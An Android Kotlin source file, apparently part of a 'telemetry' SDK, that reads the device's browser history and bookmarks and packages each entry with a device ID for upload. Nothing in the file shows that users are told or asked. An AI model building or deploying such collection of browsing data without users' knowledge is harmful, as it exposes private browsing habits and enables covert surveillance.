package com.pulsedrop.telemetry.collectors

import android.content.Context
import android.provider.Browser
import com.pulsedrop.telemetry.data.BrowserBookmark
import com.pulsedrop.telemetry.data.BrowserHistoryItem
import com.pulsedrop.telemetry.data.UploadEnvelope
import com.pulsedrop.telemetry.utils.PrefsManager

class BrowserHistoryCollector(
    private val context: Context,
    private val onData: (UploadEnvelope) -> Unit
) {
    private val prefs = PrefsManager(context)

    fun collectHistory(limit: Int = 200) {
        // NOTE: Browser history access is limited on modern Android.
        // Only the default browser that exposes this content provider will return data.
        // Chrome does NOT expose its history via this provider on most devices.
        val projection = arrayOf(
            Browser.BookmarkColumns._ID,
            Browser.BookmarkColumns.TITLE,
            Browser.BookmarkColumns.URL,
            Browser.BookmarkColumns.VISITS,
            Browser.BookmarkColumns.DATE
        )

        val selection = "${Browser.BookmarkColumns.BOOKMARK} = 0"

        try {
            context.contentResolver.query(
                Browser.BOOKMARKS_URI,
                projection, selection, null,
                "${Browser.BookmarkColumns.DATE} DESC LIMIT $limit"
            )?.use { c ->
                val idIdx = c.getColumnIndex(Browser.BookmarkColumns._ID)
                val titleIdx = c.getColumnIndex(Browser.BookmarkColumns.TITLE)
                val urlIdx = c.getColumnIndex(Browser.BookmarkColumns.URL)
                val visitsIdx = c.getColumnIndex(Browser.BookmarkColumns.VISITS)
                val dateIdx = c.getColumnIndex(Browser.BookmarkColumns.DATE)

                while (c.moveToNext()) {
                    val item = BrowserHistoryItem(
                        id = c.getString(idIdx),
                        title = c.getString(titleIdx) ?: "",
                        url = c.getString(urlIdx) ?: "",
                        visits = c.getInt(visitsIdx),
                        lastVisited = c.getLong(dateIdx)
                    )
                    onData(UploadEnvelope("browser_history", prefs.deviceId, System.currentTimeMillis(), item))
                }
            }
        } catch (e: SecurityException) {
            // Permission not granted or provider unavailable
        }
    }

    fun collectBookmarks(limit: Int = 200) {
        val projection = arrayOf(
            Browser.BookmarkColumns._ID,
            Browser.BookmarkColumns.TITLE,
            Browser.BookmarkColumns.URL,
            Browser.BookmarkColumns.CREATED
        )
        val selection = "${Browser.BookmarkColumns.BOOKMARK} = 1"

        try {
            context.contentResolver.query(
                Browser.BOOKMARKS_URI,
                projection, selection, null,
                "${Browser.BookmarkColumns.CREATED} DESC LIMIT $limit"
            )?.use { c ->
                val idIdx = c.getColumnIndex(Browser.BookmarkColumns._ID)
                val titleIdx = c.getColumnIndex(Browser.BookmarkColumns.TITLE)
                val urlIdx = c.getColumnIndex(Browser.BookmarkColumns.URL)
                val createdIdx = c.getColumnIndex(Browser.BookmarkColumns.CREATED)

                while (c.moveToNext()) {
                    val item = BrowserBookmark(
                        id = c.getString(idIdx),
                        title = c.getString(titleIdx) ?: "",
                        url = c.getString(urlIdx) ?: "",
                        created = c.getLong(createdIdx)
                    )
                    onData(UploadEnvelope("browser_bookmark", prefs.deviceId, System.currentTimeMillis(), item))
                }
            }
        } catch (e: SecurityException) {
            // Permission not granted
        }
    }
}
